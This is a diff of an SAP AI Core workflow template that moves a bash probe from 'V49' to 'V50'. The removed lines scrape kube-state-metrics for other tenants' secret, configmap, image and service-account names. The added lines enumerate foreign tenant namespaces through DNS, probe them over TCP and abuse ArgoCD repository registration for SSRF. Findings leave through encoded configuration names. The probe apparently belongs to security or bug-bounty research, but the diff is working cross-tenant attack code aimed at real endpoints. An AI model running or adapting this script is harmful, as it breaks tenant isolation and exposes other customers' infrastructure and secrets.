@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "49.0.0"
+    ai.sap.com/version: "50.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,7 +24,7 @@ spec:
       - bash
       - -c
       - |
-        # V49: Deep KSM extraction - secrets, configmaps, services across tenants
+        # V50: Cross-tenant network access test + ArgoCD SSRF to tenant services
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -35,105 +35,78 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v49-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v50-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        KSM_PODS="100.106.241.163"
-        KSM_MULTI="100.110.128.70"
-        KSM_CUSTOM="100.110.192.195"
+        # Pick 5 other tenant RG namespaces to probe
+        TARGETS="rg-765c091a-cd927cab rg-a70b5e11-cd927cab rg-4b258265-cd927cab rg-00909d9a-cd927cab rg-ee1f1ccd-cd927cab"
 
-        # 1. KSM-multi: check for secrets, configmaps, services metrics
-        echo "=== METRIC TYPES ===" >&2
-        MULTI=$(curl -sk --connect-timeout 20 "http://${KSM_MULTI}:8080/metrics" 2>&1)
-
-        # All metric families
-        FAMILIES=$(echo "$MULTI" | grep '^# HELP' | awk '{print $3}' | sort -u)
-        FCOUNT=$(echo "$FAMILIES" | wc -l | tr -d ' ')
-        save "multi-families-${FCOUNT}"
-
-        # Save metric families in batches
-        BATCH=""
-        BNUM=1
-        while IFS= read -r fam; do
-          if [ -n "$fam" ]; then
-            BATCH="${BATCH}${fam}."
-            if [ ${#BATCH} -gt 180 ]; then
-              save "multi-fam-${BNUM}-${BATCH}"
-              BATCH=""
-              BNUM=$((BNUM + 1))
+        # 1. DNS enumeration of services in other tenant namespaces
+        echo "=== CROSS-TENANT DNS ===" >&2
+        for rg in $TARGETS; do
+          # Common SAP AI Core service names
+          FOUND=""
+          for svc in api-server inference-server serving model-server deployment-server argo-server default; do
+            ip=$(dig +short "${svc}.${rg}.svc.cluster.local" 2>/dev/null | head -1)
+            if [ -n "$ip" ]; then
+              FOUND="${FOUND}${svc}=${ip}."
             fi
-          fi
-        done <<< "$FAMILIES"
-        [ -n "$BATCH" ] && save "multi-fam-${BNUM}-${BATCH}"
+          done
+          # Also try SRV wildcard
+          SRV=$(dig +short SRV "*.${rg}.svc.cluster.local" 2>/dev/null | head -3 | tr '\n' '|')
+          save "dns-${rg}-${FOUND:-none}-srv-${SRV:-empty}"
+        done
 
-        # 2. Secret metrics specifically
-        SECRETS=$(echo "$MULTI" | grep -i 'kube_secret')
-        if [ -n "$SECRETS" ]; then
-          SEC_COUNT=$(echo "$SECRETS" | wc -l | tr -d ' ')
-          save "secrets-lines-${SEC_COUNT}"
-          # Secret names from other tenants
-          SEC_NAMES=$(echo "$SECRETS" | grep 'namespace="rg-\|namespace="mt-' | grep -v 'rg-3ba0e0a4' | grep -o 'secret="[^"]*"' | sort -u | head -15 | tr '\n' '|')
-          save "xtenant-secrets-${SEC_NAMES}"
-        else
-          save "secrets-absent-from-multi"
-        fi
+        # 2. Direct TCP connectivity test to other tenant pods (if IPs found)
+        echo "=== CROSS-TENANT TCP ===" >&2
+        for rg in $TARGETS; do
+          # Try connecting to the default service endpoint
+          R=$(curl -sk --connect-timeout 3 "http://default.${rg}.svc.cluster.local/" 2>&1 | head -c 150)
+          save "tcp-${rg}-default-$(echo $R | head -c 100)"
 
-        # 3. ConfigMap metrics
-        CMS=$(echo "$MULTI" | grep -i 'kube_configmap')
-        if [ -n "$CMS" ]; then
-          CM_NAMES=$(echo "$CMS" | grep -v 'rg-3ba0e0a4' | grep -o 'configmap="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-          save "configmaps-${CM_NAMES}"
-        else
-          save "configmaps-absent"
-        fi
+          # Try port 8080 (common serving port)
+          R=$(curl -sk --connect-timeout 3 "http://${rg}.svc.cluster.local:8080/" 2>&1 | head -c 100)
+          save "tcp-${rg}-8080-$(echo $R | head -c 80)"
+        done
 
-        # 4. Service metrics
-        SVCS=$(echo "$MULTI" | grep -i 'kube_service')
-        if [ -n "$SVCS" ]; then
-          SVC_NAMES=$(echo "$SVCS" | grep -v 'rg-3ba0e0a4' | grep -o 'service="[^"]*"' | sort -u | head -15 | tr '\n' '|')
-          save "services-${SVC_NAMES}"
-        else
-          save "services-absent"
-        fi
+        # 3. ArgoCD SSRF to specific tenant service
+        echo "=== ARGOCD TENANT SSRF ===" >&2
+        # Register repo pointing to another tenant's namespace
+        for rg in rg-765c091a-cd927cab rg-a70b5e11-cd927cab; do
+          REPO_NAME="xt-${rg}"
+          REPO_URL="http://default.${rg}.svc.cluster.local/test"
 
-        # 5. KSM-pods: more detail on cross-ns pods
-        echo "=== KSM-PODS DEEP ===" >&2
-        PODS=$(curl -sk --connect-timeout 20 "http://${KSM_PODS}:8080/metrics" 2>&1)
-        PODS_SIZE=$(echo "$PODS" | wc -c | tr -d ' ')
-        save "pods-size-${PODS_SIZE}"
+          RR=$(curl -sk -X POST "${API}/v2/admin/repositories" \
+            -H "Authorization: Bearer $JWT" \
+            -H "AI-Resource-Group: default" \
+            -H "Content-Type: application/json" \
+            -d "{\"name\":\"${REPO_NAME}\",\"url\":\"${REPO_URL}\",\"username\":\"x\",\"password\":\"x\"}" 2>/dev/null)
+          save "argocd-repo-${rg}-$(echo $RR | head -c 80)"
 
-        # Pod families available
-        POD_FAMS=$(echo "$PODS" | grep '^# HELP' | awk '{print $3}' | sort -u | head -20 | tr '\n' '|')
-        save "pods-families-${POD_FAMS}"
+          # Create app
+          AR=$(curl -sk -X POST "${API}/v2/admin/applications" \
+            -H "Authorization: Bearer $JWT" \
+            -H "AI-Resource-Group: default" \
+            -H "Content-Type: application/json" \
+            -d "{\"applicationName\":\"xt-${rg}-app\",\"repositoryUrl\":\"${REPO_URL}\",\"revision\":\"HEAD\",\"path\":\".\"}" 2>/dev/null)
+          save "argocd-app-${rg}-$(echo $AR | head -c 80)"
+        done
 
-        # Container images from pods in other namespaces
-        XIMAGES=$(echo "$PODS" | grep 'kube_pod_container_info' | grep -v 'rg-3ba0e0a4' | grep -o 'image="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "pods-ximages-${XIMAGES}"
+        # 4. Check our own namespace DNS to understand the naming pattern
+        echo "=== OUR NS ===" >&2
+        OUR_RG="rg-3ba0e0a4-cd927cab"
+        OWN_SVCS=""
+        for svc in $(dig +short SRV "*.${OUR_RG}.svc.cluster.local" 2>/dev/null | awk '{print $4}' | head -5); do
+          OWN_SVCS="${OWN_SVCS}${svc}."
+        done
+        save "own-svcs-${OWN_SVCS:-none}"
 
-        # Container names
-        XCONTAINERS=$(echo "$PODS" | grep 'kube_pod_container_info' | grep -v 'rg-3ba0e0a4' | grep -o 'container="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "pods-xcontainers-${XCONTAINERS}"
+        # Check what IPs are in our namespace
+        OWN_PODS=$(dig +short A "*.${OUR_RG}.svc.cluster.local" 2>/dev/null | head -3 | tr '\n' '|')
+        save "own-pods-${OWN_PODS:-none}"
 
-        # Pod IPs
-        XPODIPS=$(echo "$PODS" | grep 'kube_pod_info' | grep -v 'rg-3ba0e0a4' | grep -o 'pod_ip="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "pods-xpodips-${XPODIPS}"
-
-        # Service accounts used by pods
-        XSA=$(echo "$PODS" | grep 'kube_pod_spec_' | grep -v 'rg-3ba0e0a4' | grep -o 'service_account="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "pods-xsa-${XSA}"
-
-        # 6. KSM-custom: what CRD types exist
-        echo "=== KSM-CUSTOM ===" >&2
-        CUSTOM=$(curl -sk --connect-timeout 15 "http://${KSM_CUSTOM}:8080/metrics" 2>&1)
-        CUSTOM_FAMS=$(echo "$CUSTOM" | grep '^# HELP' | awk '{print $3}' | sort -u | head -20 | tr '\n' '|')
-        save "custom-families-${CUSTOM_FAMS}"
-
-        # CRD groups
-        CRD_GROUPS=$(echo "$CUSTOM" | grep -o 'customresource_group="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "custom-crd-groups-${CRD_GROUPS}"
-
-        echo "V49 DONE" >&2
+        echo "V50 DONE" >&2
